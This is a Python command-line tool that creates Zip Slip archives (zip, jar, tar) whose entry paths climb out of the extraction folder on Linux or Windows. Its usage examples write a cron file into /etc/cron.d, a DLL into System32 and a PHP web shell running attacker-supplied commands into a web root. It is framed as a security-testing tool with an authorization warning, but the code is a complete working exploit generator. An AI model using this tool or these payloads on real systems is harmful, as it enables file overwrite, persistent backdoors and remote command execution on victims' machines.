#!/usr/bin/env python3
"""
s31zipslip Vulnerability Archive Creator
Creates archives with Zip Slip vulnerability for security testing purposes.
Supports both Linux (forward slashes) and Windows (backslashes) path traversal.
"""

import os
import sys
import zipfile
import tarfile
import argparse
import platform

def detect_platform_from_path(path):
    """
    Detect target platform based on path separators
    Returns: 'windows' or 'linux'
    """
    if '\\' in path and '/' not in path:
        return 'windows'
    elif '/' in path and '\\' not in path:
        return 'linux'
    else:
        # Mixed or no slashes, default to current platform
        return 'windows' if platform.system().lower() == 'windows' else 'linux'

def normalize_path_for_archive(target_directory, filename, target_platform):
    """
    Normalize path for the target platform
    """
    if target_platform == 'windows':
        # For Windows, use backslashes and ensure proper Windows path format
        malicious_path = target_directory.replace('/', '\\')
        if not malicious_path.endswith('\\'):
            malicious_path += '\\'
        malicious_path += filename
        return malicious_path
    else:
        # For Linux, use forward slashes
        malicious_path = target_directory.replace('\\', '/')
        if not malicious_path.endswith('/'):
            malicious_path += '/'
        malicious_path += filename
        return malicious_path

def create_zip_slip(output_file, target_directory, filename, content="Test file content"):
    """
    Create an archive with Zip Slip vulnerability for Windows or Linux
    """
    try:
        # Detect target platform from path
        target_platform = detect_platform_from_path(target_directory)
        print(f"Detected target platform: {target_platform.upper()}")
        
        # Create temporary file with content
        temp_file = "temp_content.txt"
        with open(temp_file, 'w') as f:
            f.write(content)
        
        # Normalize path for the target platform
        malicious_path = normalize_path_for_archive(target_directory, filename, target_platform)
        print(f"Malicious path in archive: {malicious_path}")
        
        # Create archive based on extension
        if output_file.endswith('.zip'):
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(temp_file, malicious_path)
        
        elif output_file.endswith('.jar'):
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(temp_file, malicious_path)
        
        elif output_file.endswith(('.tar', '.tar.gz', '.tgz', '.tar.bz2')):
            mode = 'w'
            if output_file.endswith('.tar.gz') or output_file.endswith('.tgz'):
                mode = 'w:gz'
            elif output_file.endswith('.tar.bz2'):
                mode = 'w:bz2'
            
            with tarfile.open(output_file, mode) as tar:
                tar.add(temp_file, arcname=malicious_path)
        
        else:
            print(f"Error: Unsupported archive format: {output_file}")
            return False
        
        # Clean up temporary file
        os.remove(temp_file)
        return True
        
    except Exception as e:
        print(f"Error creating archive: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="Create archives with Zip Slip vulnerability for security testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Linux path traversal (forward slashes)
  python3 s31zipslip.py -d '../../../../../../../tmp/a/' -f test.txt -o test.zip
  python3 s31zipslip.py -d '../../../../../../../etc/cron.d/' -f malicious.cron -o payload.tar.gz
  
  # Windows path traversal (backslashes)
  python3 s31zipslip.py -d '..\\..\\..\\..\\..\\..\\Windows\\Temp\\' -f test.txt -o test.zip
  python3 s31zipslip.py -d '..\\..\\..\\..\\..\\..\\Windows\\System32\\' -f malicious.dll -o exploit.jar
  
  # With custom content
  python3 s31zipslip.py -d '../../../../../../../var/www/html/' -f shell.php -o exploit.jar -c "<?php system(\$_GET['cmd']); ?>"

Supported formats: zip, jar, tar, tar.gz, tgz, tar.bz2

⚠️  WARNING: Use only for authorized security testing on systems you own.
         Never use this tool for illegal or malicious purposes.
"""
    )
    
    parser.add_argument('-d', '--directory', required=True,
                       help='Target directory path for Zip Slip (e.g., ../../../../../../../tmp/a/ for Linux or ..\\..\\..\\Windows\\Temp\\ for Windows)')
    
    parser.add_argument('-f', '--filename', required=True,
                       help='Filename to create inside the archive')
    
    parser.add_argument('-o', '--output', required=True,
                       help='Output archive filename (supports: zip, jar, tar, tar.gz, tgz, tar.bz2)')
    
    parser.add_argument('-c', '--content', default='Test file content',
                       help='File content (default: "Test file content")')
    
    # Show help if no arguments provided
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()
    
    print("Creating Zip Slip archive...")
    print(f"Target path: {os.path.join(args.directory, args.filename)}")
    print(f"Output file: {args.output}")
    
    success = create_zip_slip(args.output, args.directory, args.filename, args.content)
    
    if success:
        print("Archive successfully created!")
    else:
        print("Failed to create archive")

if __name__ == "__main__":
    main()